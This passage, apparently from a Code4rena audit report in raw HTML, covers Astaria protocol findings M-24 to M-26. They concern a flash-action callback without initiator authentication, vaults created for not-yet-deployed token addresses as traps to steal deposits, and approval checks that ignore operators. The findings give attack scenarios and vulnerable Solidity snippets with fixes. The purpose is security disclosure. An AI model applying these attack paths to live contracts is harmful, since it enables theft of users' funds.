4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Remove unnecessary code.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/175\">androolloyd (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-24-flashauction-doesnt-pass-the-initiator-to-the-recipient-\" style=\"position:relative;\"><a href=\"#m-24-flashauction-doesnt-pass-the-initiator-to-the-recipient-\" aria-label=\"m 24 flashauction doesnt pass the initiator to the recipient  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/166\">[M-24] FlashAuction doesn’t pass the initiator to the recipient </a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/166\">Ruhum</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/CollateralToken.sol#L307-L310\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/CollateralToken.sol#L307-L310</a></p>\n<p>Existing flashloans pass the initiator to the recipient in the function’s params, e.g. <a href=\"https://github.com/aave/aave-v3-core/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol#L29\">AAVE</a> or <a href=\"https://github.com/Uniswap/v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol#L4\">Uniswap</a>. It’s done to allow the recipient to verify the legitimacy of the call.</p>\n<p>The CollateralToken’s <code>flashAction()</code> function doesn’t pass the initiator. That makes it more difficult to integrate the flashAction functionality. To protect yourself against other people executing the callback you have to:</p>\n<ul>\n<li>create a flag</li>\n<li>add an authorized function that sets the flag to true</li>\n<li>only allow <code>onFlashAction()</code> to be executed when the flag is true</li>\n</ul>\n<p>Considering that most people won’t bother with that there’s a significant risk of this being abused. While this doesn’t affect the Astaria protocol directly, it potentially affects its users and their funds. Because of that, I decided to rate it as MEDIUM.</p>\n<h3 id=\"proof-of-concept-42\" style=\"position:relative;\"><a href=\"#proof-of-concept-42\" aria-label=\"proof of concept 42 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>onFlashAction()</code> is executed with the ERC721 token data (contract addr, ID, and return address) as well as the arbitrary <code>data</code> bytes.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">receiver</span><span class=\"mtk1\">.</span><span class=\"mtk11\">onFlashAction</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IFlashAction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">Underlying</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">], </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-40\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-40\" aria-label=\"recommended mitigation steps 40 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add the initiator to the callback to allow easy authentication.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/166\">androolloyd (Astaria) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/166#issuecomment-1441327414\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Considering the number of exploits we’ve seen with this, this is nearly high severity in my opinion.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-25-vault-can-be-created-for-not-yet-existing-erc20-tokens-which-allows-attackers-to-set-traps-to-steal-nfts-from-borrowers\" style=\"position:relative;\"><a href=\"#m-25-vault-can-be-created-for-not-yet-existing-erc20-tokens-which-allows-attackers-to-set-traps-to-steal-nfts-from-borrowers\" aria-label=\"m 25 vault can be created for not yet existing erc20 tokens which allows attackers to set traps to steal nfts from borrowers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/158\">[M-25] Vault can be created for not-yet-existing ERC20 tokens, which allows attackers to set traps to steal NFTs from Borrowers</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/158\">pwnforce</a></em></p>\n<p>There is a subtle difference between the implementation of solmate’s SafeTransferLib and OZ’s SafeERC20: OZ’s SafeERC20 checks if the token is a contract or not, solmate’s SafeTransferLib does not.<br>\nSee: <a href=\"https://github.com/Rari-Capital/solmate/blob/main/src/utils/SafeTransferLib.sol#L9\">https://github.com/Rari-Capital/solmate/blob/main/src/utils/SafeTransferLib.sol#L9</a><br>\nNote that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.<br>\nAs a result, when the token’s address has no code, the transaction will just succeed with no error.<br>\nThis attack vector was made well-known by the qBridge hack back in Jan 2022.</p>\n<p>In AstariaRouter, Vault, PublicVault, VaultImplementation, ClearingHouse, TransferProxy, and WithdrawProxy, the <code>safetransfer</code> and <code>safetransferfrom</code> don’t check the existence of code at the token address. This is a known issue while using solmate’s libraries.</p>\n<p>Hence this can lead to miscalculation of funds and also loss of funds , because if safetransfer() and safetransferfrom() are called on a token address that doesn’t have contract in it, it will always return success. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred.</p>\n<p>So this will lead to miscalculation and loss of funds.</p>\n<h3 id=\"attack-scenario-example\" style=\"position:relative;\"><a href=\"#attack-scenario-example\" aria-label=\"attack scenario example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack scenario (example):</h3>\n<p>It’s becoming popular for protocols to deploy their token across multiple networks and when they do so, a common practice is to deploy the token contract from the same deployer address and with the same nonce so that the token address can be the same for all the networks.</p>\n<p>A sophisticated attacker can exploit it by taking advantage of that and setting traps on multiple potential tokens to steal from the borrowers. For example: 1INCH is using the same token address for both Ethereum and BSC; Gelato’s <code>$GEL</code> token is using the same token address for Ethereum, Fantom and Polygon.</p>\n<ul>\n<li>ProjectA has TokenA on another network;</li>\n<li>ProjectB has TokenB on another network;</li>\n<li>ProjectC has TokenC on another network;</li>\n<li>A malicious strategist (Bob) can create new PublicVaults with amounts of 10000E18 for TokenA, TokenB, and TokenC.</li>\n<li>A few months later, ProjectB lunched TokenB on the local network at the same address;</li>\n<li>Alice as a liquidator deposited 11000e18 TokenB into the vault;</li>\n<li>The attacker (Bob) can withdraw to receive most of Alice’s added TokenB.</li>\n</ul>\n<h3 id=\"proof-of-concept-43\" style=\"position:relative;\"><a href=\"#proof-of-concept-43\" aria-label=\"proof of concept 43 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L490\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L490</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L795\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L795</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L66\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L66</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L72\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L72</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L384\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L384</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L394\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L394</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L406\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L406</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L143\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L143</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L161\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L161</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/TransferProxy.sol#L34\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/TransferProxy.sol#L34</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L269\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L269</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L281\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L281</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L298\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L298</a></p>\n<h3 id=\"recommended-mitigation-steps-41\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-41\" aria-label=\"recommended mitigation steps 41 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>This issue won’t exist if OpenZeppelin’s SafeERC20 is used instead.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/158#issuecomment-1404011644\">androolloyd (Astaria) commented</a>:</strong></p>\n<blockquote>\n<p>The protocol has no enforcement of the assets that can be listed, only tokens that are known should be interacted with by users and UI implementations.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/158\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/158#issuecomment-1443332368\">Picodes (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Keeping this report as medium due to the credibility of the attack path described.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-26-collateraltoken-should-allow-to-execute-token-owners-action-to-approved-addresses\" style=\"position:relative;\"><a href=\"#m-26-collateraltoken-should-allow-to-execute-token-owners-action-to-approved-addresses\" aria-label=\"m 26 collateraltoken should allow to execute token owners action to approved addresses permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/134\">[M-26] CollateralToken should allow to execute token owner’s action to approved addresses</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/134\">ladboy233</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L274\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L274</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L266\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L266</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L238\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L238</a></p>\n<p>Let us look into the code below in <code>VaultImplementation#_validateCommitment</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateCommitment</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">IAstariaRouter.Commitment </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">computeId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">ERC721</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CT</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk11\">COLLATERAL_TOKEN</span><span class=\"mtk1\">()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">holder</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">CT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">CT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getApproved</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">holder</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">holder</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">operator</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  !</span><span class=\"mtk12\">CT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isApprovedForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">holder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidRequest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidRequestReason</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NO_AUTHORITY</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>the code check should also check that <code>msg.sender != operator</code> to make the check complete, if the msg.sender comes from an approved operator, the call should be valid.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">holder</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">holder</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">operator</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">operator</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  !</span><span class=\"mtk12\">CT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isApprovedForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">holder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidRequest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidRequestReason</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NO_AUTHORITY</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>AND</p>\n<p>CollateralToken functions flashAction, releaseToAddress are restricted to the owner of token only. But they should be allowed for approved addresses as well.</p>\n<p>For example, in flashAuction, only the owner of the collateral token can start the flashAction, then approved operator by owner cannot start flashAction.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">flashAction</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IFlashAction</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p>Note the check onlyOwner(collateralId) does not check if the msg.sender is an approved operator.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-42\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-42\" aria-label=\"recommended mitigation steps 42 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 